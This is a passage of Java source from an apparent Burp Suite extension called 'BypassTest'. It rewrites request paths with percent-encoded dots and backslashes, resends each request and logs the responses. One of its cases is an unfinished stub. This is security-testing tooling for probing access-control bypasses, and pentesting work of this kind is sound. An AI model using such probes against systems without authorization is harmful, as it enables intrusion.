                            if(pm.size()<appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")){
                                int addtims = appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")-pm.size();
                                for(int iaddtims=0;iaddtims<addtims;iaddtims++){
                                    pm.add(addtims+iaddtims,"\r\n");
                                }
                            }
                            byte[] postMessage = join(pm, "\r\n").getBytes(StandardCharsets.UTF_8);
                            resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        }catch (Throwable e){
                            e.printStackTrace();
                        }

                        LogEntry logEntry;
                        logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Please Check "+thepath, resp);
                        log.add(logEntry);
                        log.set(row+1, logEntry);
                        logadd = logadd + 1;
                        fireTableRowsUpdated(this.loghang, logadd);
                        Thread.sleep(1000);
                    }
                    break;
                case "Encode.\\":
                    for (int i = 0; i < misclist.size(); i++) {
                        try {
                            String encodepath = new URL(misclist.get(i)).getPath();
                            encodeurl = misclist.get(i).substring(0,misclist.get(i).indexOf(encodepath))+encodepath.replace(".", "%2E").replace("\\","%5C");
                            misclist.set(i,encodeurl);
                        }catch (Exception e){

                        }
                        //这里发送更新后的请求
                        IHttpRequestResponse resp = null;
                        String thepath = null;
                        try {
                            List<String> pm = new ArrayList<>(Arrays.asList(new String(baseRequestResponse.getRequest()).split("\r\n")));
                            thepath = new URL(misclist.get(i)).getPath();
                            if(pm.get(0).contains("GET")){
                                pm.set(0, "GET " + thepath + " HTTP/1.1");
                            }else {
                                pm.set(0, "POST " + thepath + " HTTP/1.1");
                            }
                            if(pm.size()<appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")){
                                int addtims = appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")-pm.size();
                                for(int iaddtims=0;iaddtims<addtims;iaddtims++){
                                    pm.add(addtims+iaddtims,"\r\n");
                                }
                            }
                            byte[] postMessage = join(pm, "\r\n").getBytes(StandardCharsets.UTF_8);
                            resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        }catch (Throwable e){
                            e.printStackTrace();
                        }

                        LogEntry logEntry;
                        logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Please Check "+thepath, resp);
                        log.add(logEntry);
                        log.set(row+1, logEntry);
                        logadd = logadd + 1;
                        fireTableRowsUpdated(this.loghang, logadd);
                        Thread.sleep(1000);
                    }
                    break;
                case "EncodeOnebyOne":
                    for (int i = 0; i < misclist.size(); i++) {
                        System.out.println("555");
                        //这里发送更新后的请求
                    }
                    break;

            }
        }

    }

    @Override
    public String getColumnName(int column) {
        switch (column){
            case 0:
                return "URL";
            case 1:
                return "Status";
            case 2:
                return "Result";
            default:
                return "";
        }
    }

    // 实现 ITab 接口的 getTabCaption 方法
    @Override
    public String getTabCaption() {
        return "BypassTest";
    }

    @Override
    public Component getUiComponent() {
        return splitPane;
    }

    // 实现 ITab 接口的 getUiComponent 方法

}
